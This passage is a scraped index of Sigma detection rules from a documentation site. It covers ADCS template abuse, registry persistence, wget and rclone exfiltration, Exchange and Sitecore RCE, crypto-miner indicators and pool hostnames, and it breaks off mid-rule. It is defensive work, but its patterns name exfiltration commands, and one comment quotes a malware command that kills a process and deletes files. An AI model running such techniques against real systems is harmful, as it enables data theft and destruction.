ADCS Certificate Template Configuration Vulnerability id: 5ee3a654-372f-11ec-8d3d-0242ac130003 status: experimental description: Detects certificate creation with template allowing risk permission subject references: - https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf author: Orlinum , BlueDefenZer date: 2021/11/17 tags: - attack.privilege_escalation - attack.credential_access logsource: product: windows service: security definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be comming if template contain specific flag. detection: selection1: EventID: 4898 TemplateContent|contains: \u0026#39;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u0026#39; selection2: EventID: 4899 NewTemplateContent|contains: \u0026#39;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u0026#39; condition: selection1 or selection2 falsepositives: - Administrator activity - Penetration tests - Proxy SSL certificate with subject modification - Smart card enrollement level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_adcs_certificate_template_configuration_vulnerability.yml/","tags":["attack.privilege_escalation","attack.credential_access"],"title":"ADCS Certificate Template Configuration Vulnerability"},{"categories":null,"contents":"Detects certificate creation with template allowing risk permission subject and risky EKU\nKnown false-positives Administrator activity Penetration tests Proxy SSL certificate with subject modification Smart card enrollement References https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf Raw rule (edit) title: ADCS Certificate Template Configuration Vulnerability with Risky EKU id: bfbd3291-de87-4b7c-88a2-d6a5deb28668 status: experimental description: Detects certificate creation with template allowing risk permission subject and risky EKU references: - https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf author: Orlinum , BlueDefenZer date: 2021/11/17 tags: - attack.privilege_escalation - attack.credential_access logsource: product: windows service: security definition: Certificate services loaded a template would trigger event ID 4898 and certificate Services template was updated would trigger event ID 4899. A risk permission seems to be comming if template contain specific flag with risky EKU. detection: selection10: EventID: 4898 TemplateContent|contains: - \u0026#39;1.3.6.1.5.5.7.3.2\u0026#39; - \u0026#39;1.3.6.1.5.2.3.4\u0026#39; - \u0026#39;1.3.6.1.4.1.311.20.2.2\u0026#39; - \u0026#39;2.5.29.37.0\u0026#39; selection11: TemplateContent|contains: \u0026#39;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u0026#39; selection20: EventID: 4899 NewTemplateContent|contains: - \u0026#39;1.3.6.1.5.5.7.3.2\u0026#39; - \u0026#39;1.3.6.1.5.2.3.4\u0026#39; - \u0026#39;1.3.6.1.4.1.311.20.2.2\u0026#39; - \u0026#39;2.5.29.37.0\u0026#39; selection21: NewTemplateContent|contains: \u0026#39;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\u0026#39; condition: (selection10 and selection11) or (selection20 and selection21) falsepositives: - Administrator activity - Penetration tests - Proxy SSL certificate with subject modification - Smart card enrollement level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_adcs_certificate_template_configuration_vulnerability_eku.yml/","tags":["attack.privilege_escalation","attack.credential_access"],"title":"ADCS Certificate Template Configuration Vulnerability with Risky EKU"},{"categories":null,"contents":"Detects persistence registry keys for Recycle Bin\nKnown false-positives unknown References https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf Raw rule (edit) title: Registry Persistence Mechanisms in Recycle Bin id: 277efb8f-60be-4f10-b4d3-037802f37167 status: experimental description: Detects persistence registry keys for Recycle Bin references: - https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf date: 2021/11/18 author: frack113 logsource: category: registry_event product: windows detection: Create_key: EventType: RenameKey NewName: HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open Set_key: EventType: SetValue TargetObject: HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default) condition: Create_key or Set_key tags: - attack.persistence - attack.t1547 falsepositives: - unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_persistence_recycle_bin.yml/","tags":["attack.persistence","attack.t1547"],"title":"Registry Persistence Mechanisms in Recycle Bin"},{"categories":null,"contents":"Detects attempts to post the file with the usage of wget utility. The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow.\nKnown false-positives legitimate usage of wget utility to post a file References https://attack.mitre.org/tactics/TA0010/ https://linux.die.net/man/1/wget https://gtfobins.github.io/gtfobins/wget/ Raw rule (edit) title: Data Exfiltration with Wget id: cb39d16b-b3b6-4a7a-8222-1cf24b686ffc description: Detects attempts to post the file with the usage of wget utility. The adversary can bypass the permission restriction with the misconfigured sudo permission for wget utility which could allow them to read files like /etc/shadow. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/11/18 references: - https://attack.mitre.org/tactics/TA0010/ - https://linux.die.net/man/1/wget - https://gtfobins.github.io/gtfobins/wget/ logsource: product: linux service: auditd detection: wget: type: EXECVE a0: wget a1|startswith: \u0026#39;--post-file=\u0026#39; condition: wget tags: - attack.exfiltration - attack.t1048.003 falsepositives: - legitimate usage of wget utility to post a file level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_data_exfil_wget.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"Data Exfiltration with Wget"},{"categories":null,"contents":"Detects log entries that appear in exploitation attempts against MS Exchange RCE CVE-2021-42321\nKnown false-positives Unknown, please report false positives via https://github.com/SigmaHQ/sigma/issues References https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321 Raw rule (edit) title: Possible Exploitation of Exchange RCE CVE-2021-42321 id: c92f1896-d1d2-43c3-92d5-7a5b35c217bb status: experimental description: Detects log entries that appear in exploitation attempts against MS Exchange RCE CVE-2021-42321 references: - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321 author: \u0026#39;Florian Roth, @testanull\u0026#39; date: 2021/11/18 logsource: product: windows service: msexchange-management detection: selection: EventID: - 6 - 8 keywords: - \u0026#39;Cmdlet failed. Cmdlet Get-App, \u0026#39; - \u0026#39;Task Get-App throwing unhandled exception: System.InvalidCastException:\u0026#39; condition: selection and keywords falsepositives: - Unknown, please report false positives via https://github.com/SigmaHQ/sigma/issues level: critical tags: - attack.lateral_movement - attack.t1210 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_exchange_cve_2021_42321.yml/","tags":["attack.lateral_movement","attack.t1210"],"title":"Possible Exploitation of Exchange RCE CVE-2021-42321"},{"categories":null,"contents":"Detects exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx\nKnown false-positives Vulnerability Scanning/Pentesting References https://blog.assetnote.io/2021/11/02/sitecore-rce/ https://support.sitecore.com/kb?id=kb_article_view\u0026amp;sysparm_article=KB1000776 Raw rule (edit) title: Sitecore Pre-Auth RCE CVE-2021-42237 id: 20c6ed1c-f7f0-4ea3-aa65-4f198e6acb0f status: experimental description: Detects exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx author: Florian Roth date: 2021/11/17 references: - https://blog.assetnote.io/2021/11/02/sitecore-rce/ - https://support.sitecore.com/kb?id=kb_article_view\u0026amp;sysparm_article=KB1000776 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: \u0026#39;POST\u0026#39; c-uri|contains: \u0026#39;/sitecore/shell/ClientBin/Reporting/Report.ashx\u0026#39; sc-status: 200 condition: selection falsepositives: - Vulnerability Scanning/Pentesting level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_42237_sitecore_report_ashx.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Sitecore Pre-Auth RCE CVE-2021-42237"},{"categories":null,"contents":"Detects the creation of tasks from processes executed from suspicious locations\nKnown false-positives Unknown References Internal Research Raw rule (edit) title: Suspicious Scheduled Task Write to System32 Tasks id: 80e1f67a-4596-4351-98f5-a9c3efabac95 status: experimental description: Detects the creation of tasks from processes executed from suspicious locations references: - Internal Research author: Florian Roth date: 2021/11/16 modified: 2022/01/12 tags: - attack.persistence - attack.execution - attack.t1053 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: \u0026#39;\\Windows\\System32\\Tasks\u0026#39; Image|contains: - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;C:\\PerfLogs\u0026#39; - \u0026#39;\\Windows\\System32\\config\\systemprofile\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_task_write.yml/","tags":["attack.persistence","attack.execution","attack.t1053"],"title":"Suspicious Scheduled Task Write to System32 Tasks"},{"categories":null,"contents":"Suspicious add key for BitLocker\nKnown false-positives unknown References https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/ Raw rule (edit) title: Suspicious Reg Add BitLocker id: 0e0255bf-2548-47b8-9582-c0955c9283f5 status: experimental description: Suspicious add key for BitLocker references: - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/ tags: - attack.impact - attack.t1486 author: frack113 date: 2021/11/15 logsource: category: process_creation product: windows detection: set: CommandLine|contains|all: - \u0026#39;REG\u0026#39; - \u0026#39;ADD\u0026#39; - \u0026#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\u0026#39; - \u0026#39;/v\u0026#39; - \u0026#39;/f\u0026#39; key: CommandLine|contains: - \u0026#39;EnableBDEWithNoTPM\u0026#39; - \u0026#39;UseAdvancedStartup\u0026#39; - \u0026#39;UseTPM\u0026#39; - \u0026#39;UseTPMKey\u0026#39; - \u0026#39;UseTPMKeyPIN\u0026#39; - \u0026#39;RecoveryKeyMessageSource\u0026#39; - \u0026#39;UseTPMPIN\u0026#39; - \u0026#39;RecoveryKeyMessage\u0026#39; condition: set and key falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_reg_bitlocker.yml/","tags":["attack.impact","attack.t1486"],"title":"Suspicious Reg Add BitLocker"},{"categories":null,"contents":"Detects the attempt to evade or obfuscate the executed command on the CommandLine using bogus path traversal\nKnown false-positives Google Drive References https://twitter.com/hexacorn/status/1448037865435320323 https://twitter.com/Gal_B1t/status/1062971006078345217 Raw rule (edit) title: Command Line Path Traversal Evasion status: experimental id: 1327381e-6ab0-4f38-b583-4c1b8346a56b author: Christian Burkard date: 2021/10/26 modified: 2022/02/02 description: Detects the attempt to evade or obfuscate the executed command on the CommandLine using bogus path traversal references: - https://twitter.com/hexacorn/status/1448037865435320323 - https://twitter.com/Gal_B1t/status/1062971006078345217 tags: - attack.defense_evasion - attack.t1036 logsource: category: process_creation product: windows detection: selection1: Image|contains: \u0026#39;\\Windows\\\u0026#39; CommandLine|contains: - \u0026#39;\\..\\Windows\\\u0026#39; - \u0026#39;\\..\\System32\\\u0026#39; - \u0026#39;\\..\\..\\\u0026#39; selection2: CommandLine|contains: \u0026#39;.exe\\..\\\u0026#39; filter: CommandLine|contains: \u0026#39;\\Google\\Drive\\googledrivesync.exe\\..\\\u0026#39; condition: 1 of selection* and not filter falsepositives: - Google Drive level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_commandline_path_traversal_evasion.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Command Line Path Traversal Evasion"},{"categories":null,"contents":"suspicious command line to remove exe or dll\nKnown false-positives unknown References https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D Raw rule (edit) title: Suspicious Del in CommandLine id: 204b17ae-4007-471b-917b-b917b315c5db status: experimental description: suspicious command line to remove exe or dll author: frack113 date: 2021/12/02 references: - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D tags: - attack.defense_evasion - attack.t1070.004 logsource: category: process_creation product: windows detection: susp_del_exe: CommandLine|contains|all: - \u0026#39;del *.exe\u0026#39; - \u0026#39;/f \u0026#39; - \u0026#39;/q \u0026#39; susp_del_dll: CommandLine|contains|all: - \u0026#39;del *.dll\u0026#39; - \u0026#39;C:\\ProgramData\\\u0026#39; condition: susp_del_exe or susp_del_dll #cmd.exe (PID: 1044 cmdline: \u0026#39;C:\\Windows\\System32\\cmd.exe\u0026#39; /c taskkill /im A8D4.exe /f \u0026amp; timeout /t 6 \u0026amp; del /f /q \u0026#39;C:\\Users\\user~1\\AppData\\Local\\Temp\\A8D4.exe\u0026#39; \u0026amp; del C:\\ProgramData\\*.dll \u0026amp; exit falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_del.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Suspicious Del in CommandLine"},{"categories":null,"contents":"Detects command line parameters or strings often used by crypto miners\nKnown false-positives Legitimate use of crypto miners References https://www.poolwatch.io/coin/monero Raw rule (edit) title: Linux Crypto Mining Indicators id: 9069ea3c-b213-4c52-be13-86506a227ab1 status: experimental description: Detects command line parameters or strings often used by crypto miners references: - https://www.poolwatch.io/coin/monero date: 2021/10/26 author: Florian Roth logsource: product: linux category: process_creation detection: selection: CommandLine|contains: - \u0026#39; --cpu-priority=\u0026#39; - \u0026#39;--donate-level=0\u0026#39; - \u0026#39; -o pool.\u0026#39; - \u0026#39; --nicehash\u0026#39; - \u0026#39; --algo=rx/0 \u0026#39; - \u0026#39;stratum+tcp://\u0026#39; - \u0026#39;stratum+udp://\u0026#39; # Sub process started by xmrig - the most popular Monero crypto miner - unknown if this causes any false positives - \u0026#39;sh -c /sbin/modprobe msr allow_writes=on\u0026#39; # base64 encoded: --donate-level= - \u0026#39;LS1kb25hdGUtbGV2ZWw9\u0026#39; - \u0026#39;0tZG9uYXRlLWxldmVsP\u0026#39; - \u0026#39;tLWRvbmF0ZS1sZXZlbD\u0026#39; # base64 encoded: stratum+tcp:// and stratum+udp:// - \u0026#39;c3RyYXR1bSt0Y3A6Ly\u0026#39; - \u0026#39;N0cmF0dW0rdGNwOi8v\u0026#39; - \u0026#39;zdHJhdHVtK3RjcDovL\u0026#39; - \u0026#39;c3RyYXR1bSt1ZHA6Ly\u0026#39; - \u0026#39;N0cmF0dW0rdWRwOi8v\u0026#39; - \u0026#39;zdHJhdHVtK3VkcDovL\u0026#39; condition: selection falsepositives: - Legitimate use of crypto miners level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_crypto_mining.yml/","tags":null,"title":"Linux Crypto Mining Indicators"},{"categories":null,"contents":"Detects process connections to a Monero crypto mining pool\nKnown false-positives Legitimate use of crypto miners References https://www.poolwatch.io/coin/monero Raw rule (edit) title: Linux Crypto Mining Pool Connections id: a46c93b7-55ed-4d27-a41b-c259456c4746 status: stable description: Detects process connections to a Monero crypto mining pool references: - https://www.poolwatch.io/coin/monero date: 2021/10/26 author: Florian Roth logsource: product: linux category: network_connection detection: selection: DestinationHostname: - \u0026#39;pool.minexmr.com\u0026#39; - \u0026#39;fr.minexmr.com\u0026#39; - \u0026#39;de.minexmr.com\u0026#39; - \u0026#39;sg.minexmr.com\u0026#39; - \u0026#39;ca.minexmr.com\u0026#39; - \u0026#39;us-west.minexmr.com\u0026#39; - \u0026#39;pool.supportxmr.com\u0026#39; - \u0026#39;mine.c3pool.com\u0026#39; - \u0026#39;xmr-eu1.nanopool.org\u0026#39; - \u0026#39;xmr-eu2.nanopool.org\u0026#39; - \u0026#39;xmr-us-east1.nanopool.org\u0026#39; - \u0026#39;xmr-us-west1.nanopool.org\u0026#39; - \u0026#39;xmr-asia1.nanopool.org\u0026#39; - \u0026#39;xmr-jp1.nanopool.org\u0026#39; - \u0026#39;xmr-au1.nanopool.org\u0026#39; - \u0026#39;xmr.2miners.com\u0026#39; - \u0026#39;xmr.hashcity.org\u0026#39; - \u0026#39;xmr.f2pool.com\u0026#39; - \u0026#39;xmrpool.eu\u0026#39; - \u0026#39;pool.hashvault.pro\u0026#39; - \u0026#39;moneroocean.stream\u0026#39; - \u0026#39;monerocean.stream\u0026#39; condition: selection falsepositives: - Legitimate use of crypto miners level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml/","tags":null,"title":"Linux Crypto Mining Pool Connections"},{"categories":null,"contents":"Detects command line parameters or strings often used by crypto miners\nKnown false-positives Legitimate use of crypto miners References https://www.poolwatch.io/coin/monero Raw rule (edit) title: Windows Crypto Mining Indicators id: 66c3b204-9f88-4d0a-a7f7-8a57d521ca55 description: Detects command line parameters or strings often used by crypto miners status: stable references: - https://www.poolwatch.io/coin/monero author: Florian Roth date: 2021/10/26 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39; --cpu-priority=\u0026#39; - \u0026#39;--donate-level=0\u0026#39; - \u0026#39; -o pool.\u0026#39; - \u0026#39; --nicehash\u0026#39; - \u0026#39; --algo=rx/0 \u0026#39; - \u0026#39;stratum+tcp://\u0026#39; - \u0026#39;stratum+udp://\u0026#39; # base64 encoded: --donate-level= - \u0026#39;LS1kb25hdGUtbGV2ZWw9\u0026#39; - \u0026#39;0tZG9uYXRlLWxldmVsP\u0026#39; - \u0026#39;tLWRvbmF0ZS1sZXZlbD\u0026#39; # base64 encoded: stratum+tcp:// and stratum+udp:// - \u0026#39;c3RyYXR1bSt0Y3A6Ly\u0026#39; - \u0026#39;N0cmF0dW0rdGNwOi8v\u0026#39; - \u0026#39;zdHJhdHVtK3RjcDovL\u0026#39; - \u0026#39;c3RyYXR1bSt1ZHA6Ly\u0026#39; - \u0026#39;N0cmF0dW0rdWRwOi8v\u0026#39; - \u0026#39;zdHJhdHVtK3VkcDovL\u0026#39; condition: selection falsepositives: - Legitimate use of crypto miners level: high tags: - attack.impact - attack.t1496 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_crypto_mining_monero.yml/","tags":["attack.impact","attack.t1496"],"title":"Windows Crypto Mining Indicators"},{"categories":null,"contents":"Detects process connections to a Monero crypto mining pool\nKnown false-positives Legitimate use of crypto miners References https://www.poolwatch.io/coin/monero Raw rule (edit) title: Windows Crypto Mining Pool Connections id: fa5b1358-b040-4403-9868-15f7d9ab6329 status: stable description: Detects process connections to a Monero crypto mining pool references: - https://www.poolwatch.io/coin/monero date: 2021/10/26 author: Florian Roth logsource: category: network_connection product: windows detection: selection: DestinationHostname: - \u0026#39;pool.minexmr.com\u0026#39; - \u0026#39;fr.minexmr.com\u0026#39; - \u0026#39;de.minexmr.com\u0026#39; - \u0026#39;sg.minexmr.com\u0026#39; - \u0026#39;ca.minexmr.com\u0026#39; - \u0026#39;us-west.minexmr.com\u0026#39; - \u0026#39;pool.supportxmr.com\u0026#39; - \u0026#39;mine.c3pool.com\u0026#39; - \u0026#39;xmr-eu1.nanopool.org\u0026#39; - \u0026#39;xmr-eu2.nanopool.org\u0026#39; - \u0026#39;xmr-us-east1.nanopool.org\u0026#39; - \u0026#39;xmr-us-west1.nanopool.org\u0026#39; - \u0026#39;xmr-asia1.nanopool.org\u0026#39; - \u0026#39;xmr-jp1.nanopool.org\u0026#39; - \u0026#39;xmr-au1.nanopool.org\u0026#39; - \u0026#39;xmr.2miners.com\u0026#39; - \u0026#39;xmr.hashcity.org\u0026#39; - \u0026#39;xmr.f2pool.com\u0026#39; - \u0026#39;xmrpool.eu\u0026#39; - \u0026#39;pool.hashvault.pro\u0026#39; - \u0026#39;moneroocean.stream\u0026#39; - \u0026#39;monerocean.stream\u0026#39; condition: selection falsepositives: - Legitimate use of crypto miners level: high tags: - attack.impact - attack.t1496 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_crypto_mining.yml/","tags":["attack.impact","attack.t1496"],"title":"Windows Crypto Mining Pool Connections"},{"categories":null,"contents":"Malware can use mountable Virtual Hard Disk .vhd file to encapsulate payloads and evade security controls\nKnown false-positives Legitimate user creation References https://redcanary.com/blog/intelligence-insights-october-2021/ https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/ https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/ Raw rule (edit) title: Suspicious VHD Image Download From Browser id: 8468111a-ef07-4654-903b-b863a80bbc95 status: test description: Malware can use mountable Virtual Hard Disk .vhd file to encapsulate payloads and evade security controls references: - https://redcanary.com/blog/intelligence-insights-october-2021/ - https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/ - https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/ author: frack113, Christopher Peacock \u0026#39;@securepeacock\u0026#39;, SCYTHE \u0026#39;@scythe_io\u0026#39; date: 2021/10/25 modified: 2021/10/29 tags: - attack.resource_development - attack.t1587.001 logsource: category: file_event product: windows definition: in sysmon add \u0026#34;\u0026lt;TargetFilename condition=\u0026#34;end with\u0026#34;\u0026gt;.vhd\u0026lt;/TargetFilename\u0026gt; \u0026lt;!--vhd files for ZLoader and lazarus malware vectors --\u0026gt;\u0026#34; detection: selection: Image|endswith: - chrome.exe - firefox.exe - microsoftedge.exe - microsoftedgecp.exe - msedge.exe - iexplorer.exe - brave.exe - opera.exe TargetFilename|contains: \u0026#39;.vhd\u0026#39; #not endswith to get the alternate data stream log Too TargetFilename: C:\\Users\\Frack113\\Downloads\\windows.vhd:Zone.Identifier condition: selection falsepositives: - Legitimate user creation level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_mal_vhd_download.yml/","tags":["attack.resource_development","attack.t1587.001"],"title":"Suspicious VHD Image Download From Browser"},{"categories":null,"contents":"Attempts to detect PowerShell writing startup shortcuts. This procedure was highlighted in Red Canary Intel Insights Oct. 2021, \u0026ldquo;We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence. Accordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats. In the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL\u0026rdquo;\nKnown false-positives Unknown Depending on your environment accepted applications may leverage this at times. It is recomended to search for anomolies inidicative of malware. References https://redcanary.com/blog/intelligence-insights-october-2021/ https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder Raw rule (edit) title: PowerShell Writing Startup Shortcuts id: 92fa78e7-4d39-45f1-91a3-8b23f3f1088d description: Attempts to detect PowerShell writing startup shortcuts. This procedure was highlighted in Red Canary Intel Insights Oct. 2021, \u0026#34;We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence. Accordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats. In the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL\u0026#34; status: experimental references: - https://redcanary.com/blog/intelligence-insights-october-2021/ - https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder tags: - attack.registry_run_keys_/_startup_folder - attack.t1547.001 date: 2021/10/24 author: Christopher Peacock \u0026#39;@securepeacock\u0026#39;, SCYTHE level: high logsource: product: windows category: file_event detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; TargetFilename|contains: \u0026#39;\\start menu\\programs\\startup\\\u0026#39; TargetFilename|endswith: \u0026#39;.lnk\u0026#39; condition: selection falsepositives: - Unknown - Depending on your environment accepted applications may leverage this at times. It is recomended to search for anomolies inidicative of malware. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_powershell_startup_shortcuts.yml/","tags":["attack.registry_run_keys_/_startup_folder","attack.t1547.001"],"title":"PowerShell Writing Startup Shortcuts"},{"categories":null,"contents":"Detects Rclone which is commonly used by ransomware groups for exfiltration\nKnown false-positives Legitimate Rclone usage (rare) References https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ Raw rule (edit) title: Rclone Execution via Command Line or PowerShell id: cb7286ba-f207-44ab-b9e6-760d82b84253 description: Detects Rclone which is commonly used by ransomware groups for exfiltration status: deprecated date: 2021/05/26 author: Aaron Greetham (@beardofbinary) - NCC Group references: - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Rclone usage (rare) level: high logsource: product: windows category: process_creation detection: exec_selection: Image|endswith: \u0026#39;\\rclone.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\PowerShell.exe\u0026#39; - \u0026#39;\\cmd.exe\u0026#39; command_selection: CommandLine|contains: - \u0026#39; pass \u0026#39; - \u0026#39; user \u0026#39; - \u0026#39; copy \u0026#39; - \u0026#39; mega \u0026#39; - \u0026#39; sync \u0026#39; - \u0026#39; config \u0026#39; - \u0026#39; lsd \u0026#39; - \u0026#39; remote \u0026#39; - \u0026#39; ls \u0026#39; description_selection: Description: \u0026#39;Rsync for cloud storage\u0026#39; condition: command_selection and ( description_selection or exec_selection ) ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/win_susp_rclone_exec.yml/","tags":["attack.exfiltration","attack.t1567.002"],"title":"Rclone Execution via Command Line or PowerShell"},{"categories":null,"contents":"Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nKnown false-positives Legitimate RClone use References https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html Raw rule (edit) title: RClone Execution id: a0d63692-a531-4912-ad39-4393325b2a9c status: deprecated description: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc tags: - attack.exfiltration - attack.t1567.002 author: Bhabesh Raj, Sittikorn S date: 2021/05/10 modified: 2021/06/29 references: - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate RClone use level: high logsource: category: process_creation product: windows detection: selection: Description: \u0026#39;Rsync for cloud storage\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;--config \u0026#39; - \u0026#39;--no-check-certificate \u0026#39; - \u0026#39; copy \u0026#39; selection3: Image|endswith: - \u0026#39;\\rclone.exe\u0026#39; CommandLine|contains: - \u0026#39;mega\u0026#39; - \u0026#39;pcloud\u0026#39; - \u0026#39;ftp\u0026#39; - \u0026#39;--progress\u0026#39; - \u0026#39;--ignore-existing\u0026#39; - \u0026#39;--auto-confirm\u0026#39; - \u0026#39;--transfers\u0026#39; - \u0026#39;--multi-thread-streams\u0026#39; condition: 1 of selection* ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/sysmon_rclone_execution.yml/","tags":["attack.exfiltration","attack.t1567.002"],"title":"RClone Execution"},{"categories":null,"contents":"Detects suspicious DNS queries to Monero mining pools\nKnown false-positives Legitimate crypto coin mining References https://www.nextron-systems.com/2021/10/24/monero-mining-pool-fqdns/ Raw rule (edit) title: Monero Crypto Coin Mining Pool Lookup id: b593fd50-7335-4682-a36c-4edcb68e4641 status: stable description: Detects suspicious DNS queries to Monero mining pools author: Florian Roth date: 2021/10/24 references: - https://www.nextron-systems.com/2021/10/24/monero-mining-pool-fqdns/ logsource: category: dns detection: selection: query|contains: - \u0026#39;pool.minexmr.com\u0026#39; - \u0026#39;fr.minexmr.com\u0026#39; - \u0026#39;de.minexmr.com\u0026#39; - \u0026#39;sg.minexmr.com\u0026#39; - \u0026#39;ca.minexmr.com\u0026#39; - \u0026#39;us-west.minexmr.com\u0026#39; - \u0026#39;pool.supportxmr.com\u0026#39; - \u0026#39;mine.c3pool.com\u0026#39; - \u0026#39;xmr-eu1.nanopool.org\u0026#39; - \u0026#39;xmr-eu2.nanopool.org\u0026#39; - \u0026#39;xmr-us-east1.nanopool.org\u0026#39; - \u0026#39;xmr-us-west1.nanopool.org\u0026#39; - \u0026#39;xmr-asia1.nanopool.org\u0026#39; - \u0026#39;xmr-jp1.nanopool.org\u0026#39; - \u0026#39;xmr-au1.nanopool.org\u0026#39; - \u0026#39;xmr.2miners.com\u0026#39; - \u0026#39;xmr.hashcity.org\u0026#39; - \u0026#39;xmr.f2pool.com\u0026#39; - \u0026#39;xmrpool.eu\u0026#39; - \u0026#39;pool.hashvault.pro\u0026#39; condition: selection falsepositives: - Legitimate crypto coin mining tags: - attack.impact - attack.t1496 - attack.t1567 level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_pua_cryptocoin_mining_xmr.yml/","tags":["attack.impact","attack.t1496","attack.t1567"],"title":"Monero Crypto Coin Mining Pool Lookup"},{"categories":null,"contents":"Detects the execution of AzureHound in PowerShell, a tool to gather data from Azure for BloodHound\nKnown false-positives Penetration testing References https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/AzureHound.ps1 https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html Raw rule (edit) title: AzureHound PowerShell Commands id: 83083ac6-1816-4e76-97d7-59af9a9ae46e status: experimental description: Detects the 